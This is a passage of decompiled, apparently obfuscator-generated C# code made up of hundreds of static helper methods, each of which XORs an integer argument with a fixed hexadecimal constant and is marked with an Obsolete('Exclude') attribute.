		return int_4 ^ 0x3E106E70;
	}

	[Obsolete("Exclude")]
	public static int smethod_9086(int int_4)
	{
		return int_4 ^ 0x1BED84C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_9088(int int_4)
	{
		return int_4 ^ 0x49E3203E;
	}

	[Obsolete("Exclude")]
	public static int smethod_9090(int int_4)
	{
		return int_4 ^ 0x5C92E52C;
	}

	[Obsolete("Exclude")]
	public static int smethod_9093(int int_4)
	{
		return int_4 ^ 0x44EE8511;
	}

	[Obsolete("Exclude")]
	public static int smethod_9097(int int_4)
	{
		return int_4 ^ 0x6BF97A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_9098(int int_4)
	{
		return int_4 ^ 0x289FA51;
	}

	[Obsolete("Exclude")]
	public static int smethod_9100(int int_4)
	{
		return int_4 ^ 0x3F142DF5;
	}

	[Obsolete("Exclude")]
	public static int smethod_9103(int int_4)
	{
		return int_4 ^ 0x38B05868;
	}

	[Obsolete("Exclude")]
	public static int smethod_9104(int int_4)
	{
		return int_4 ^ 0xBB71ED9;
	}

	[Obsolete("Exclude")]
	public static int smethod_9105(int int_4)
	{
		return int_4 ^ 0x2FB3815A;
	}

	[Obsolete("Exclude")]
	public static int smethod_9107(int int_4)
	{
		return int_4 ^ 0x7248A058;
	}

	[Obsolete("Exclude")]
	public static int smethod_9111(int int_4)
	{
		return int_4 ^ 0x5D580755;
	}

	[Obsolete("Exclude")]
	public static int smethod_9113(int int_4)
	{
		return int_4 ^ 0x65BDB065;
	}

	[Obsolete("Exclude")]
	public static int smethod_9116(int int_4)
	{
		return int_4 ^ 0x389F31FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_9119(int int_4)
	{
		return int_4 ^ 0x563D7078;
	}

	[Obsolete("Exclude")]
	public static int smethod_9122(int int_4)
	{
		return int_4 ^ 0x1B6733E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_9123(int int_4)
	{
		return int_4 ^ 0x7CD23509;
	}

	[Obsolete("Exclude")]
	public static int smethod_9127(int int_4)
	{
		return int_4 ^ 0x7CCC806E;
	}

	[Obsolete("Exclude")]
	public static int smethod_9130(int int_4)
	{
		return int_4 ^ 0xA1C9C59;
	}

	[Obsolete("Exclude")]
	public static int smethod_9136(int int_4)
	{
		return int_4 ^ 0x708C3459;
	}

	[Obsolete("Exclude")]
	public static int smethod_9137(int int_4)
	{
		return int_4 ^ 0x91CD758;
	}

	[Obsolete("Exclude")]
	public static int smethod_9140(int int_4)
	{
		return int_4 ^ 0x24384E24;
	}

	[Obsolete("Exclude")]
	public static int smethod_9148(int int_4)
	{
		return int_4 ^ 0x5E0753F;
	}

	[Obsolete("Exclude")]
	public static int smethod_9151(int int_4)
	{
		return int_4 ^ 0x6AB52C33;
	}

	[Obsolete("Exclude")]
	public static int smethod_9155(int int_4)
	{
		return int_4 ^ 0x7EE7A5FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_9156(int int_4)
	{
		return int_4 ^ 0x2FD010D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_9157(int int_4)
	{
		return int_4 ^ 0xF4D3F20;
	}

	[Obsolete("Exclude")]
	public static int smethod_9161(int int_4)
	{
		return int_4 ^ 0x2D7B4725;
	}

	[Obsolete("Exclude")]
	public static int smethod_9163(int int_4)
	{
		return int_4 ^ 0x49A6BA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_9166(int int_4)
	{
		return int_4 ^ 0x151F5A69;
	}

	[Obsolete("Exclude")]
	public static int smethod_9169(int int_4)
	{
		return int_4 ^ 0x27316BDB;
	}

	[Obsolete("Exclude")]
	public static int smethod_9172(int int_4)
	{
		return int_4 ^ 0x6CD95758;
	}

	[Obsolete("Exclude")]
	public static int smethod_9173(int int_4)
	{
		return int_4 ^ 0x79963AD0;
	}

	[Obsolete("Exclude")]
	public static int smethod_9178(int int_4)
	{
		return int_4 ^ 0x9D82D9B;
	}

	[Obsolete("Exclude")]
	public static int smethod_9180(int int_4)
	{
		return int_4 ^ 0x6FEFB2DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_9181(int int_4)
	{
		return int_4 ^ 0x55DBA5D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_9182(int int_4)
	{
		return int_4 ^ 0x4AD6095;
	}

	[Obsolete("Exclude")]
	public static int smethod_9189(int int_4)
	{
		return int_4 ^ 0x4E242EB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_9200(int int_4)
	{
		return int_4 ^ 0x2DDCF17A;
	}

	[Obsolete("Exclude")]
	public static int smethod_9202(int int_4)
	{
		return int_4 ^ 0x74703C30;
	}

	[Obsolete("Exclude")]
	public static int smethod_9203(int int_4)
	{
		return int_4 ^ 0x79423A93;
	}

	[Obsolete("Exclude")]
	public static int smethod_9204(int int_4)
	{
		return int_4 ^ 0x605176D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_9212(int int_4)
	{
		return int_4 ^ 0x13238E23;
	}

	[Obsolete("Exclude")]
	public static int smethod_9213(int int_4)
	{
		return int_4 ^ 0x23D2BD9;
	}

	[Obsolete("Exclude")]
	public static int smethod_9216(int int_4)
	{
		return int_4 ^ 0x7D6A9B6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_9217(int int_4)
	{
		return int_4 ^ 0x145849FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_9219(int int_4)
	{
		return int_4 ^ 0x5297A12F;
	}

	[Obsolete("Exclude")]
	public static int smethod_9221(int int_4)
	{
		return int_4 ^ 0x299F9D22;
	}

	[Obsolete("Exclude")]
	public static int smethod_9223(int int_4)
	{
		return int_4 ^ 0x686AC44A;
	}

	[Obsolete("Exclude")]
	public static int smethod_9226(int int_4)
	{
		return int_4 ^ 0x4F1517D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_9227(int int_4)
	{
		return int_4 ^ 0x7C934983;
	}

	[Obsolete("Exclude")]
	public static int smethod_9229(int int_4)
	{
		return int_4 ^ 0x4DD7FA4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_9232(int int_4)
	{
		return int_4 ^ 0x139A28FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_9233(int int_4)
	{
		return int_4 ^ 0x66F6A440;
	}

	[Obsolete("Exclude")]
	public static int smethod_9235(int int_4)
	{
		return int_4 ^ 0x731B8FFD;
	}

	[Obsolete("Exclude")]
	public static int smethod_9237(int int_4)
	{
		return int_4 ^ 0x5DD91B8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_9250(int int_4)
	{
		return int_4 ^ 0x1D6F12E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_9252(int int_4)
	{
		return int_4 ^ 0x6E84A8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_9257(int int_4)
	{
		return int_4 ^ 0x4FAF092A;
	}

	[Obsolete("Exclude")]
	public static int smethod_9267(int int_4)
	{
		return int_4 ^ 0x7522CF06;
	}

	[Obsolete("Exclude")]
	public static int smethod_9269(int int_4)
	{
		return int_4 ^ 0x90FE50A;
	}

	[Obsolete("Exclude")]
	public static int smethod_9277(int int_4)
	{
		return int_4 ^ 0xF32F9BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_9280(int int_4)
	{
		return int_4 ^ 0x2F7E7A59;
	}

	[Obsolete("Exclude")]
	public static int smethod_9281(int int_4)
	{
		return int_4 ^ 0x633DD2D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_9282(int int_4)
	{
		return int_4 ^ 0x6A1ADA9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_9283(int int_4)
	{
		return int_4 ^ 0x5A22EE31;
	}

	[Obsolete("Exclude")]
	public static int smethod_9285(int int_4)
	{
		return int_4 ^ 0x7EFF0BB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_9286(int int_4)
	{
		return int_4 ^ 0x5BC22B00;
	}

	[Obsolete("Exclude")]
	public static int smethod_9287(int int_4)
	{
		return int_4 ^ 0x385D9103;
	}

	[Obsolete("Exclude")]
	public static int smethod_9288(int int_4)
	{
		return int_4 ^ 0x377E133B;
	}

	[Obsolete("Exclude")]
	public static int smethod_9289(int int_4)
	{
		return int_4 ^ 0x127B48EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_9291(int int_4)
	{
		return int_4 ^ 0x6D552897;
	}

	[Obsolete("Exclude")]
	public static int smethod_9294(int int_4)
	{
		return int_4 ^ 0x7DC74648;
	}

	[Obsolete("Exclude")]
	public static int smethod_9304(int int_4)
	{
		return int_4 ^ 0x4F23FEFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_9305(int int_4)
	{
		return int_4 ^ 0x2888AF1A;
	}

	[Obsolete("Exclude")]
	public static int smethod_9307(int int_4)
	{
		return int_4 ^ 0x1F1A175E;
	}

	[Obsolete("Exclude")]
	public static int smethod_9310(int int_4)
	{
		return int_4 ^ 0x36AB2EC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_9316(int int_4)
	{
		return int_4 ^ 0x44E2A701;
	}

	[Obsolete("Exclude")]
	public static int smethod_9319(int int_4)
	{
		return int_4 ^ 0x6B032485;
	}

	[Obsolete("Exclude")]
	public static int smethod_9326(int int_4)
	{
		return int_4 ^ 0x5F9A6F19;
	}

	[Obsolete("Exclude")]
	public static int smethod_9327(int int_4)
	{
		return int_4 ^ 0x1A811CA7;
	}

	[Obsolete("Exclude")]
	public static int smethod_9328(int int_4)
	{
		return int_4 ^ 0x619965C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_9332(int int_4)
	{
		return int_4 ^ 0x7A6A999C;
	}

	[Obsolete("Exclude")]
	public static int smethod_9337(int int_4)
	{
		return int_4 ^ 0x1FC0E5A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_9352(int int_4)
	{
		return int_4 ^ 0x3D27D310;
	}

	[Obsolete("Exclude")]
	public static int smethod_9353(int int_4)
	{
		return int_4 ^ 0x2F8DD7E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_9355(int int_4)
	{
		return int_4 ^ 0x1E7D2E54;
	}

	[Obsolete("Exclude")]
	public static int smethod_9357(int int_4)
	{
		return int_4 ^ 0x71777D61;
	}

	[Obsolete("Exclude")]
	public static int smethod_9359(int int_4)
	{
		return int_4 ^ 0x2C37AE90;
	}

	[Obsolete("Exclude")]
	public static int smethod_9360(int int_4)
	{
		return int_4 ^ 0x38BD94B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_9363(int int_4)
	{
		return int_4 ^ 0x79341372;
	}

	[Obsolete("Exclude")]
	public static int smethod_9368(int int_4)
	{
		return int_4 ^ 0x1CCE17FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_9370(int int_4)
	{
		return int_4 ^ 0x6494586;
	}

	[Obsolete("Exclude")]
	public static int smethod_9371(int int_4)
	{
		return int_4 ^ 0x581DB074;
	}

	[Obsolete("Exclude")]
	public static int smethod_9380(int int_4)
	{
		return int_4 ^ 0x1F5532DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_9382(int int_4)
	{
		return int_4 ^ 0x2D2D36E;
	}

	[Obsolete("Exclude")]
	public static int smethod_9384(int int_4)
	{
		return int_4 ^ 0x2596B472;
	}

	[Obsolete("Exclude")]
	public static int smethod_9386(int int_4)
	{
		return int_4 ^ 0x6E1A373C;
	}

	[Obsolete("Exclude")]
	public static int smethod_9388(int int_4)
	{
		return int_4 ^ 0x34BE5656;
	}

	[Obsolete("Exclude")]
	public static int smethod_9393(int int_4)
	{
		return int_4 ^ 0x1C5EA683;
	}

	[Obsolete("Exclude")]
	public static int smethod_9397(int int_4)
	{
		return int_4 ^ 0xED38760;
	}

	[Obsolete("Exclude")]
	public static int smethod_9402(int int_4)
	{
		return int_4 ^ 0x6C446326;
	}

	[Obsolete("Exclude")]
	public static int smethod_9404(int int_4)
	{
		return int_4 ^ 0x1C7388C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_9405(int int_4)
	{
		return int_4 ^ 0x391238CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_9406(int int_4)
	{
		return int_4 ^ 0x7964F01E;
	}

	[Obsolete("Exclude")]
	public static int smethod_9407(int int_4)
	{
		return int_4 ^ 0x6FAA928A;
	}

	[Obsolete("Exclude")]
	public static int smethod_9408(int int_4)
	{
		return int_4 ^ 0x27D7DDBF;
	}

	[Obsolete("Exclude")]
	public static int smethod_9409(int int_4)
	{
		return int_4 ^ 0x209491E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_9420(int int_4)
	{
		return int_4 ^ 0x1BF6DAA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_9430(int int_4)
	{
		return int_4 ^ 0x876C1A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_9432(int int_4)
	{
		return int_4 ^ 0xE105550;
	}

	[Obsolete("Exclude")]
	public static int smethod_9440(int int_4)
	{
		return int_4 ^ 0x64750848;
	}

	[Obsolete("Exclude")]
	public static int smethod_9441(int int_4)
	{
		return int_4 ^ 0x33E11E7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_9449(int int_4)
	{
		return int_4 ^ 0x327DCA1F;
	}

	[Obsolete("Exclude")]
	public static int smethod_9450(int int_4)
	{
		return int_4 ^ 0x5F766ECB;
	}

	[Obsolete("Exclude")]
	public static int smethod_9451(int int_4)
	{
		return int_4 ^ 0x2DC72DC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_9453(int int_4)
	{
		return int_4 ^ 0x59D76D3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_9456(int int_4)
	{
		return int_4 ^ 0x606C5824;
	}

	[Obsolete("Exclude")]
	public static int smethod_9459(int int_4)
	{
		return int_4 ^ 0x5BE5A2EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_9460(int int_4)
	{
		return int_4 ^ 0x440476AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_9461(int int_4)
	{
		return int_4 ^ 0x241A6B64;
	}

	[Obsolete("Exclude")]
	public static int smethod_9465(int int_4)
	{
		return int_4 ^ 0x3BEF5330;
	}

	[Obsolete("Exclude")]
	public static int smethod_9469(int int_4)
	{
		return int_4 ^ 0x799175D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_9475(int int_4)
	{
		return int_4 ^ 0x103DCBC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_9481(int int_4)
	{
		return int_4 ^ 0x55E29DED;
	}

	[Obsolete("Exclude")]
	public static int smethod_9484(int int_4)
	{
		return int_4 ^ 0x53ADA878;
	}

	[Obsolete("Exclude")]
	public static int smethod_9498(int int_4)
	{
		return int_4 ^ 0x77F743D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_9500(int int_4)
	{
		return int_4 ^ 0x58B65F3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_9502(int int_4)
	{
		return int_4 ^ 0x772A057F;
	}

	[Obsolete("Exclude")]
	public static int smethod_9515(int int_4)
	{
		return int_4 ^ 0x529B39C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_9516(int int_4)
	{
		return int_4 ^ 0xA19E241;
	}

	[Obsolete("Exclude")]
	public static int smethod_9521(int int_4)
	{
		return int_4 ^ 0x1E0C9121;
	}

	[Obsolete("Exclude")]
	public static int smethod_9526(int int_4)
	{
		return int_4 ^ 0x7AE6F20B;
	}

	[Obsolete("Exclude")]
	public static int smethod_9529(int int_4)
	{
		return int_4 ^ 0x13F19812;
	}

	[Obsolete("Exclude")]
	public static int smethod_9542(int int_4)
	{
		return int_4 ^ 0x8CB2BCA;
	}

	[Obsolete("Exclude")]
	public static int smethod_9543(int int_4)
	{
		return int_4 ^ 0x25C75318;
	}

	[Obsolete("Exclude")]
	public static int smethod_9545(int int_4)
	{
		return int_4 ^ 0x61A3FB5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_9548(int int_4)
	{
		return int_4 ^ 0x4775F8EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_9551(int int_4)
	{
		return int_4 ^ 0x56337926;
	}

	[Obsolete("Exclude")]
	public static int smethod_9554(int int_4)
	{
		return int_4 ^ 0x4583AA40;
	}

	[Obsolete("Exclude")]
	public static int smethod_9557(int int_4)
	{
		return int_4 ^ 0x211AAB79;
	}

	[Obsolete("Exclude")]
	public static int smethod_9558(int int_4)
	{
		return int_4 ^ 0x1BD56772;
	}

	[Obsolete("Exclude")]
	public static int smethod_9560(int int_4)
	{
		return int_4 ^ 0x6FE229C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_9562(int int_4)
	{
		return int_4 ^ 0x37C24EC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_9566(int int_4)
	{
		return int_4 ^ 0x51ADF508;
	}

	[Obsolete("Exclude")]
	public static int smethod_9572(int int_4)
	{
		return int_4 ^ 0x72E6F779;
	}

	[Obsolete("Exclude")]
	public static int smethod_9593(int int_4)
	{
		return int_4 ^ 0x28704045;
	}

	[Obsolete("Exclude")]
	public static int smethod_9594(int int_4)
	{
		return int_4 ^ 0x6975172C;
	}

	[Obsolete("Exclude")]
	public static int smethod_9595(int int_4)
	{
		return int_4 ^ 0x335924CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_9597(int int_4)
	{
		return int_4 ^ 0x3B7B4272;
	}

	[Obsolete("Exclude")]
	public static int smethod_9600(int int_4)
	{
		return int_4 ^ 0x115D2F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_9606(int int_4)
	{
		return int_4 ^ 0x5B26397F;
	}

	[Obsolete("Exclude")]
	public static int smethod_9617(int int_4)
	{
		return int_4 ^ 0x2F35728F;
	}

	[Obsolete("Exclude")]
	public static int smethod_9619(int int_4)
	{
		return int_4 ^ 0x6000C658;
	}

	[Obsolete("Exclude")]
	public static int smethod_9620(int int_4)
	{
		return int_4 ^ 0x3DBE44FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_9628(int int_4)
	{
		return int_4 ^ 0x56E9FE23;
	}

	[Obsolete("Exclude")]
	public static int smethod_9630(int int_4)
	{
		return int_4 ^ 0x1C038442;
	}

	[Obsolete("Exclude")]
	public static int smethod_9638(int int_4)
	{
		return int_4 ^ 0x6C6B6462;
	}

	[Obsolete("Exclude")]
	public static int smethod_9644(int int_4)
	{
		return int_4 ^ 0x69CE9008;
	}

	[Obsolete("Exclude")]
	public static int smethod_9651(int int_4)
	{
		return int_4 ^ 0x1FE068F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_9656(int int_4)
	{
		return int_4 ^ 0xA726D1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_9657(int int_4)
	{
		return int_4 ^ 0x644767F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_9664(int int_4)
	{
		return int_4 ^ 0x6FDE9361;
	}

	[Obsolete("Exclude")]
	public static int smethod_9667(int int_4)
	{
		return int_4 ^ 0x9364E58;
	}

	[Obsolete("Exclude")]
	public static int smethod_9671(int int_4)
	{
		return int_4 ^ 0x347C5FFE;
	}

	[Obsolete("Exclude")]
	public static int smethod_9674(int int_4)
	{
		return int_4 ^ 0xB155A22;
	}

	[Obsolete("Exclude")]
	public static int smethod_9675(int int_4)
	{
		return int_4 ^ 0x5D75B507;
	}

	[Obsolete("Exclude")]
	public static int smethod_9681(int int_4)
	{
		return int_4 ^ 0x6CB084E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_9683(int int_4)
	{
		return int_4 ^ 0x3CA18DD4;
	}

	[Obsolete("Exclude")]
	public static int smethod_9689(int int_4)
	{
		return int_4 ^ 0x29B79106;
	}

	[Obsolete("Exclude")]
	public static int smethod_9694(int int_4)
	{
		return int_4 ^ 0x2F92BF9F;
	}

	[Obsolete("Exclude")]
	public static int smethod_9697(int int_4)
	{
		return int_4 ^ 0xE3A428D;
	}

	[Obsolete("Exclude")]
	public static int smethod_9698(int int_4)
	{
		return int_4 ^ 0x17EF4F00;
	}

	[Obsolete("Exclude")]
	public static int smethod_9699(int int_4)
	{
		return int_4 ^ 0xEEFD8F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_9706(int int_4)
	{
		return int_4 ^ 0x46A95B07;
	}

	[Obsolete("Exclude")]
	public static int smethod_9709(int int_4)
	{
		return int_4 ^ 0x38D0F0C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_9713(int int_4)
	{
		return int_4 ^ 0x606DBEB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_9717(int int_4)
	{
		return int_4 ^ 0xD5E4288;
	}

	[Obsolete("Exclude")]
	public static int smethod_9724(int int_4)
	{
		return int_4 ^ 0x7AA27658;
	}

	[Obsolete("Exclude")]
	public static int smethod_9725(int int_4)
	{
		return int_4 ^ 0x5C34C9C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_9731(int int_4)
	{
		return int_4 ^ 0x280E46CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_9733(int int_4)
	{
		return int_4 ^ 0x132D9B98;
	}

	[Obsolete("Exclude")]
	public static int smethod_9738(int int_4)
	{
		return int_4 ^ 0x42C99BFC;
	}

	[Obsolete("Exclude")]
	public static int smethod_9756(int int_4)
	{
		return int_4 ^ 0x433E800D;
	}

	[Obsolete("Exclude")]
	public static int smethod_9757(int int_4)
	{
		return int_4 ^ 0xB387927;
	}

	[Obsolete("Exclude")]
	public static int smethod_9760(int int_4)
	{
		return int_4 ^ 0x14F89EEA;
	}

	[Obsolete("Exclude")]
	public static int smethod_9761(int int_4)
	{
		return int_4 ^ 0x6E84DBF;
	}

	[Obsolete("Exclude")]
	public static int smethod_9762(int int_4)
	{
		return int_4 ^ 0x496DAF7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_9763(int int_4)
	{
		return int_4 ^ 0x3865E5E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_9764(int int_4)
	{
		return int_4 ^ 0xEEB48BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_9766(int int_4)
	{
		return int_4 ^ 0x6E8129AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_9769(int int_4)
	{
		return int_4 ^ 0x79502E33;
	}

	[Obsolete("Exclude")]
	public static int smethod_9776(int int_4)
	{
		return int_4 ^ 0xA7EEFED;
	}

	[Obsolete("Exclude")]
	public static int smethod_9777(int int_4)
	{
		return int_4 ^ 0x578DE46F;
	}

	[Obsolete("Exclude")]
	public static int smethod_9781(int int_4)
	{
		return int_4 ^ 0x47B0E469;
	}

	[Obsolete("Exclude")]
	public static int smethod_9784(int int_4)
	{
		return int_4 ^ 0x2DC028C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_9788(int int_4)
	{
		return int_4 ^ 0x7ABCD3CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_9795(int int_4)
	{
		return int_4 ^ 0x7474C987;
	}

	[Obsolete("Exclude")]
	public static int smethod_9798(int int_4)
	{
		return int_4 ^ 0x5C89244E;
	}

	[Obsolete("Exclude")]
	public static int smethod_9799(int int_4)
	{
		return int_4 ^ 0x2F9CA230;
	}

	[Obsolete("Exclude")]
	public static int smethod_9807(int int_4)
	{
		return int_4 ^ 0x2B673D1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_9810(int int_4)
	{
		return int_4 ^ 0x7272814D;
	}

	[Obsolete("Exclude")]
	public static int smethod_9823(int int_4)
	{
		return int_4 ^ 0x1F89098;
	}

	[Obsolete("Exclude")]
	public static int smethod_9824(int int_4)
	{
		return int_4 ^ 0x69101367;
	}

	[Obsolete("Exclude")]
	public static int smethod_9829(int int_4)
	{
		return int_4 ^ 0x54C0B167;
	}

	[Obsolete("Exclude")]
	public static int smethod_9830(int int_4)
	{
		return int_4 ^ 0x29A6B878;
	}

	[Obsolete("Exclude")]
	public static int smethod_9832(int int_4)
	{
		return int_4 ^ 0x380ABA0D;
	}

	[Obsolete("Exclude")]
	public static int smethod_9834(int int_4)
	{
		return int_4 ^ 0x528C8563;
	}

	[Obsolete("Exclude")]
	public static int smethod_9837(int int_4)
	{
		return int_4 ^ 0x4A118241;
	}

	[Obsolete("Exclude")]
	public static int smethod_9844(int int_4)
	{
		return int_4 ^ 0x650AC1B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_9847(int int_4)
	{
		return int_4 ^ 0x11F9B01B;
	}

	[Obsolete("Exclude")]
	public static int smethod_9848(int int_4)
	{
		return int_4 ^ 0x7A2376E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_9862(int int_4)
	{
		return int_4 ^ 0x34621B62;
	}

	[Obsolete("Exclude")]
	public static int smethod_9863(int int_4)
	{
		return int_4 ^ 0x44FA5F06;
	}

	[Obsolete("Exclude")]
	public static int smethod_9865(int int_4)
	{
		return int_4 ^ 0x28D01DA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_9866(int int_4)
	{
		return int_4 ^ 0x738CECA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_9870(int int_4)
	{
		return int_4 ^ 0x10440DF2;
	}

	[Obsolete("Exclude")]
	public static int smethod_9876(int int_4)
	{
		return int_4 ^ 0x61BE4A44;
	}

	[Obsolete("Exclude")]
	public static int smethod_9887(int int_4)
	{
		return int_4 ^ 0x2F9AA495;
	}

	[Obsolete("Exclude")]
	public static int smethod_9889(int int_4)
	{
		return int_4 ^ 0x17A02A62;
	}

	[Obsolete("Exclude")]
	public static int smethod_9891(int int_4)
	{
		return int_4 ^ 0x45632F76;
	}

	[Obsolete("Exclude")]
	public static int smethod_9895(int int_4)
	{
		return int_4 ^ 0x35B73FC9;
	}

	[Obsolete("Exclude")]
	public static int smethod_9904(int int_4)
	{
		return int_4 ^ 0x2B50C23C;
	}

	[Obsolete("Exclude")]
	public static int smethod_9905(int int_4)
	{
		return int_4 ^ 0xC555D09;
	}

	[Obsolete("Exclude")]
	public static int smethod_9907(int int_4)
	{
		return int_4 ^ 0x4D05CF8F;
	}

	[Obsolete("Exclude")]
	public static int smethod_9915(int int_4)
	{
		return int_4 ^ 0x382276D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_9920(int int_4)
	{
		return int_4 ^ 0x68F1D44A;
	}

	[Obsolete("Exclude")]
	public static int smethod_9921(int int_4)
	{
		return int_4 ^ 0x15F6509A;
	}

	[Obsolete("Exclude")]
	public static int smethod_9926(int int_4)
	{
		return int_4 ^ 0x69093F32;
	}

	[Obsolete("Exclude")]
	public static int smethod_9930(int int_4)
	{
		return int_4 ^ 0x7F9A215F;
	}

	[Obsolete("Exclude")]
	public static int smethod_9932(int int_4)
	{
		return int_4 ^ 0x595A37A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_9938(int int_4)
	{
		return int_4 ^ 0x3FC3D4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_9939(int int_4)
	{
		return int_4 ^ 0x397198CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_9940(int int_4)
	{
		return int_4 ^ 0x1E11CA03;
	}

	[Obsolete("Exclude")]
	public static int smethod_9941(int int_4)
	{
		return int_4 ^ 0x7A9E9654;
	}

	[Obsolete("Exclude")]
	public static int smethod_9945(int int_4)
	{
		return int_4 ^ 0x7FC01B13;
	}

	[Obsolete("Exclude")]
	public static int smethod_9956(int int_4)
	{
		return int_4 ^ 0x4572FAFE;
	}

	[Obsolete("Exclude")]
	public static int smethod_9961(int int_4)
	{
		return int_4 ^ 0x44874FCA;
	}

	[Obsolete("Exclude")]
	public static int smethod_9965(int int_4)
	{
		return int_4 ^ 0x4150DE6B;
	}

	[Obsolete("Exclude")]
	public static int smethod_9966(int int_4)
	{
		return int_4 ^ 0x29DEAD9B;
	}

	[Obsolete("Exclude")]
	public static int smethod_9967(int int_4)
	{
		return int_4 ^ 0x7FDE185B;
	}

	[Obsolete("Exclude")]
	public static int smethod_9969(int int_4)
	{
		return int_4 ^ 0x3F428073;
	}

	[Obsolete("Exclude")]
	public static int smethod_9979(int int_4)
	{
		return int_4 ^ 0x4D9F35FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_9982(int int_4)
	{
		return int_4 ^ 0x25820C38;
	}

	[Obsolete("Exclude")]
	public static int smethod_9987(int int_4)
	{
		return int_4 ^ 0x341190A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_9988(int int_4)
	{
		return int_4 ^ 0x61CD3;
	}

	[Obsolete("Exclude")]
	public static int smethod_9995(int int_4)
	{
		return int_4 ^ 0xB1A517D;
	}

	[Obsolete("Exclude")]
	public static int smethod_9998(int int_4)
	{
		return int_4 ^ 0x3E2EFFDD;
	}

	[Obsolete("Exclude")]
	public static int smethod_10007(int int_4)
	{
		return int_4 ^ 0x3EA5850C;
	}

	[Obsolete("Exclude")]
	public static int smethod_10009(int int_4)
	{
		return int_4 ^ 0x7BF6C19F;
	}

	[Obsolete("Exclude")]
	public static int smethod_10012(int int_4)
	{
		return int_4 ^ 0xB1833C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_10013(int int_4)
	{
		return int_4 ^ 0x7D9995F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_10017(int int_4)
	{
		return int_4 ^ 0x7ACAED12;
	}

	[Obsolete("Exclude")]
	public static int smethod_10020(int int_4)
	{
		return int_4 ^ 0x5F19339A;
	}

	[Obsolete("Exclude")]
	public static int smethod_10023(int int_4)
	{
		return int_4 ^ 0x13F6B295;
	}

	[Obsolete("Exclude")]
	public static int smethod_10025(int int_4)
	{
		return int_4 ^ 0x1F505BEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_10027(int int_4)
	{
		return int_4 ^ 0x724A0F66;
	}

	[Obsolete("Exclude")]
	public static int smethod_10040(int int_4)
	{
		return int_4 ^ 0x1304C6D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_10041(int int_4)
	{
		return int_4 ^ 0x47CF717E;
	}

	[Obsolete("Exclude")]
	public static int smethod_10056(int int_4)
	{
		return int_4 ^ 0x3FEF4DB9;
	}

	[Obsolete("Exclude")]
	public static int smethod_10061(int int_4)
	{
